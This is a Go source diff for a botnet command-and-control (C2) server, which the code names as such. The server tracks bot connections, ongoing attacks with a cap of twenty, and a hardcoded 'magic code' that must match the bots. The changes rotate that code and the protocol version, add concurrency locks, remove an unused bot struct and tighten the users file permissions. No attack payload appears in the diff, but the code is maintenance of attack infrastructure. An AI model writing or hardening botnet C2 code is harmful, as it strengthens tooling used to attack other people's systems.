@@ -25,8 +25,8 @@ const (
 	USER_SERVER_PORT = "420"
 
 	// Authentication  these must match bot
-	MAGIC_CODE       = "2$IicIfr@vY9ureJ"
-	PROTOCOL_VERSION = "proto57"
+	MAGIC_CODE       = "wM$hJABF&2oV@qky"
+	PROTOCOL_VERSION = "v4.1"
 )
 
 type BotConnection struct {
@@ -67,15 +67,16 @@ type Credential struct {
 }
 
 var (
-	ongoingAttacks = make(map[net.Conn]attack)
-	botConnections = make(map[string]*BotConnection)
-	botConnsLock   sync.RWMutex
-	botCount       int
-	botConns       []net.Conn
-	commandOrigin  = make(map[string]net.Conn) // botID -> user connection that sent command
-	originLock     sync.RWMutex
-	tuiMode        bool      // Global flag for TUI mode
-	c2StartTime    time.Time // When the C2 server was started
+	ongoingAttacks     = make(map[net.Conn]attack)
+	ongoingAttacksLock sync.RWMutex
+	botConnections     = make(map[string]*BotConnection)
+	botConnsLock       sync.RWMutex
+	botCount           int
+	commandOrigin      = make(map[string]net.Conn) // botID -> user connection that sent command
+	originLock         sync.RWMutex
+	clientsLock        sync.RWMutex
+	tuiMode            bool      // Global flag for TUI mode
+	c2StartTime        time.Time // When the C2 server was started
 )
 
 // logMsg prints a message only if not in TUI mode (avoids messing up TUI display)
@@ -85,13 +86,7 @@ func logMsg(format string, args ...interface{}) {
 	}
 }
 
-type bot struct {
-	arch string
-	conn net.Conn
-}
-
 var (
-	bots       = []bot{}
 	clients    = []*client{}
 	maxAttacks = 20
 )
@@ -138,7 +133,7 @@ func main() {
 			return
 		}
 
-		if err := os.WriteFile(USERS_FILE, bytes, 0777); err != nil {
+		if err := os.WriteFile(USERS_FILE, bytes, 0600); err != nil {
 			fmt.Println("Error writing to users.json:", err)
 			return
 		}
